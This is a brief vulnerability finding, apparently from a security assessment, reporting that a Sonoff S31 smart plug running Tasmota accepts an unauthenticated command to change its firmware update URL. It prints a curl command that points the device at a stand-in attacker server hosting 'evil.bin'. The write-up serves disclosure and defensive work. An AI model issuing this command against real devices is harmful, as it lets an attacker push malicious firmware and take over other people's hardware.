#  OTA URL Hijack

## 📋 Summary
The Sonoff S31 smart plug running Tasmota firmware was found to accept an unauthenticated command to set a new firmware update source (OTA URL). This allows an attacker to redirect the device to download firmware from a malicious server.

## Command Used
```bash
curl "http://192.168.8.214/cm?cmnd=OtaUrl%20http://attacker.com/evil.bin"
```
